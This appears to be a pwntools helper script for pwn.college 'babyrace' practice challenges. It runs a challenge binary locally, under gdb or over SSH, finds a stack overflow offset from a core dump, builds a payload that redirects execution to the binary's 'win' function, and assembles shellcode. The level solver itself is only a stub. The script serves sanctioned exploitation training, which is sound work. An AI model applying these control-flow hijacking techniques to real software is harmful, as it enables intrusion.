import os
import pwn
import sys

from pwnlib.elf.corefile import CorefileFinder

pwn.context.log_level = 'error'
pwn.context.terminal = ['kitty']
pwn.context.rename_corefiles = False
pwn.context.delete_corefiles = True


class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/babyrace_level{self.level}"
        homedir = os.path.realpath(os.path.curdir)
        self.local_process = f"{homedir}/binaries/babyrace_level{self.level}"
        self.func_name = f"level{self.level.replace('.', '_')}"
        self.run = globals()[self.func_name]
        self.proc = None

    def set(self, proc):
        self.proc = proc

def get_payload(level, process, data):
    p = pwn.process(process)
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    p.wait_for_close()

    c = CorefileFinder(p)
    core = pwn.Coredump(c.systemd_coredump_corefile())

    print(f"RSP: {hex(core.rsp)}")
    stack_data = core.read(core.rsp, 8)
    print(f"Data: {stack_data.hex()}")
    assert stack_data in data
    payload = pwn.fit({
        pwn.cyclic_find(stack_data): elf.symbols.win
    })

    return payload

def get_level(r):
    p = r.process("hostname")
    hostname = p.recvall(timeout=1).decode()
    level = Level(hostname)
    print(f"LEVEL {level.level}")
    return level

def get_shellcode(asm_file):
    assembly = []
    with open(asm_file, 'r') as f:
        for line in f.readlines():
            assembly.append(line.split('#')[0].rstrip())

    return pwn.asm('\n'.join(assembly))

def print_shellcode(shellcode):
    output = "".join(f"\\x{byte:02x}" for byte in shellcode)
    print(output)


def level1_0(level, host, func, **kwargs):
    p = process()


def run():
    host = None
    if sys.argv[1] == 'local':
        level = Level(sys.argv[2])
        level.set(level.local_process)
        func = pwn.process
        kwargs = {
            "aslr": False,
            "close_fds": False
        }

    elif sys.argv[1] == 'dbg':
        level = Level(sys.argv[2])
        level.set(level.local_process)
        gdbscript = []
        for arg in sys.argv[3:]:
            gdbscript.append(arg)
        gdbscript = '\n'.join(gdbscript)
        func = pwn.gdb.debug
        kwargs = {
            "gdbscript": gdbscript,
            "stdin": pwn.PTY,
            "stdout": pwn.PTY,
            "aslr": False
        }

    elif sys.argv[1] == 'remote':
        host = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(host)
        level.set(level.remote_process)
        func = host.process
        kwargs = {
            "aslr": False,
        }

    else:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    level.run(level, host, func, **kwargs)

if __name__ == '__main__':
    run()
